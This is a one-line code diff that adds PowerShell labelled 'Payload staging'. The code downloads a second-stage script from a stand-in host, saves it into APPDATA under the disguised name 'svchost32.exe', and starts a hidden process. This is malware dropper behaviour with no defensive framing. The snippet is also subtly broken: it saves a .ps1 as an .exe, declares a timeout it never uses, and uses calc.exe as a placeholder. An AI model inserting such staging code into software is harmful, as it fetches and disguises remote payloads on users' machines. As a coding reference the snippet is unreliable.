@@ -1,0 +1,1 @@
+<# Payload staging #> $FetchUrl = 'https://example.com:8443/stage1.ps1'; $OutputPath = "$env:APPDATA\svchost32.exe"; $ConnectionTimeout = 138; Start-BitsTransfer -Source $FetchUrl -Destination $OutputPath; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
